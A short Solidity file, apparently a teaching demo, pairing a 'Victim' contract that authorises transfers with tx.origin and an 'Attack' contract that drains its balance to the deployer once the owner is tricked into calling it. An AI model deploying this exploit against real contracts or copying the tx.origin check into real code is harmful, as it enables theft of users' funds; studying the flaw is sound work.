// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Victim {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    function transfer(address payable _to, uint256 _amount) public {
        require(tx.origin == owner, "Not owner");
        _to.transfer(_amount);
    }
}

contract Attack {
    address payable public hacker;
    Victim victim;

    constructor(Victim _victim) {
        victim = Victim(_victim);
        //将受益者地址赋值为部署者地址
        hacker = payable(msg.sender);
    }

    function attack() public {
        //诱导Victim合约的owner调用，于是Victim合约内的余额就全部转移到黑客地址中
        victim.transfer(hacker, address(victim).balance);
    }
}
